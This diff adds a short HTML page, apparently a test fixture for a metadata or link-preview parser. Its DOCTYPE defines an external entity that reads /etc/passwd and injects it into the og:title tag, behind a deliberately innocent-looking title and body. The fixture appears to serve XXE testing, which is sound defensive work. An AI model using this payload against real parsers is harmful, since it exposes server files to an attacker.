@@ -1,0 +1,13 @@
+<!DOCTYPE html [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<html>
+<head>
+  <title>Not suspicious at all</title>
+  <meta property="og:title" content="&xxe;" />
+  <meta property="og:description" content="Just a normal page" />
+</head>
+<body>
+  Nothing to see here.
+</body>
+</html>
